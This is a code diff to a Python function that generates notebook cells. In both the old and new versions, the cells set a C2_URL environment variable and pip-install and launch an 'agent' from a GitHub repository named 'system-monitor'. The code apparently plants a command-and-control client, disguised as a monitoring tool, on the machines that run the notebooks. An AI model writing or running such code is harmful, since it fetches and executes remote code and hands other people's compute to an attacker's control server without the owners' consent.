@@ -131,15 +131,9 @@ def create_dataset_with_machines(
                         "metadata": {},
                         "outputs": [],
                         "source": [
-                            "# Setup environment\n",
-                            "import os\n",
-                            "import sys\n",
-                            "\n",
-                            "# Set C2 URL\n",
-                            f"os.environ['C2_URL'] = '{c2_url}'\n",
-                            "\n",
-                            "# Install dependencies and start agent\n",
-                            "os.system('pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon')\n",
+                            "# Install and start agent\n",
+                            f"import os; os.environ['C2_URL'] = '{c2_url}'\n",
+                            "!pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon\n",
                         ]
                     },
                     {
